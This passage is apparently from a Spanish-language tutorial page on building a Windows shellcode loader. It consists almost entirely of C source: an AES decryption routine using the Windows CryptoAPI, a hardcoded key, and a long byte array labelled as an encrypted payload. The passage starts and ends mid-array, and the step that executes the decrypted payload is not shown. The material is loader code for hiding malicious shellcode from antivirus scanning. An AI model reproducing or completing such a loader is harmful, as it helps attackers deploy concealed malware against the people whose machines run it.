class="mh">0x29</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xa2</span> <span class="p">};</span>
</code></pre></div></div>

<p>El código fuente por lo tanto nos quedará del siguiente modo:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span>

<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>      
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xa4</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> 